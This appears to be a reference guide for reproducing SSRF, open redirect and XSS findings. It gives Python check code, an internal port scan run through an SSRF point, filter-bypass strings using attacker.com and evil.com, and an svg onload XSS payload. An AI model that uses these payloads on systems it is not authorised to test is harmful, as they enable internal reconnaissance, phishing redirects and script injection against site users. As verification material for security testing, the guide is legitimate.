# SSRF / Open Redirect / XSS Reproduction Patterns

## SSRF

The signature is **server-side** reachability, observed via a timing/port difference or an external callback. Lab-safe approach without external infra: probe internal ports.

```python
# Port scan the internal target through the SSRF point (PoC-safe: connect-only)
def probe_port(s, url, path, inject_key, host, port):
    p = params.copy()
    p[inject_key] = f"http://{host}:{port}/"
    try:
        r = s.get(url + path, params=p, timeout=3)   # connect+read with short timeout
        return r.status_code != 502 and r.status_code != 504
    except (requests.exceptions.ConnectionError, TimeoutError):
        return False

open_ports = [p for p in [22, 80, 443, 3306, 6379, 8080] if probe_port(s, url, path, inject_key, "127.0.0.1", p)]
vuln = len(open_ports) >= 2
```

- Baseline: SSRF to a **public non-listening IP** must fail differently than the internal probe — if everything times out equally, the check is inconclusive (exit 2)
- Scheme tricks: `http://`, `http://127.0.0.1#.attacker.com`, `http://[::1]`, decimal IP `2130706433`, `http://127.0.0.1:80@attacker.com`
- Redirect-following SSRF: `requests` follows redirects by default — disable (`allow_redirects=False`) when the block says the SSRF does NOT follow redirects, else you measure the redirect target not the SSRF target

## Open Redirect

```python
r = s.get(url + "/redirect?url=https://evil.example.com/", allow_redirects=False, timeout=10)
vuln = r.status_code in (301, 302, 303, 307, 308) and \
       "evil.example.com" in r.headers.get("Location", "")
```

- Bypass list to try: `//evil.com`, `https:evil.com`, `javascript:alert(1)` (browser-context only), `/%5cevil.com`, `https://evil.com%2f..`
- Signature must be the **Location header** — a 200 with a body link is NOT an open redirect

## XSS

Detection is about **reflection + context**, not execution:

```python
marker = "9f2cxss"
p[inject_key] = f'"><svg onload=alert({marker})>'       # payload from structured block
r = s.get(url + path, params=p, timeout=10)
reflected = marker in r.text

# Context check: is the marker inside a JS string / attribute / script tag?
m = re.search(r'<script[^>]*>[^<]*' + marker, r.text, re.I)
in_script = m is not None
vuln = reflected and (in_script or f'"{marker}' in r.text or f"'{marker}" in r.text)
```

- Signature priority: (1) reflection of the unique marker, (2) no HTML-encoding of `<`/`>` around it, (3) the context (attribute vs script vs text node) matches what the structured block claims
- Stored XSS: two-step — POST the payload, then GET the page where it renders; the check runs on the second request
- Never use `alert(document.cookie)` payloads that could auto-fire in the tester's own browser — use inert markers; real cookie exfiltration belongs in exploit mode with explicit consent
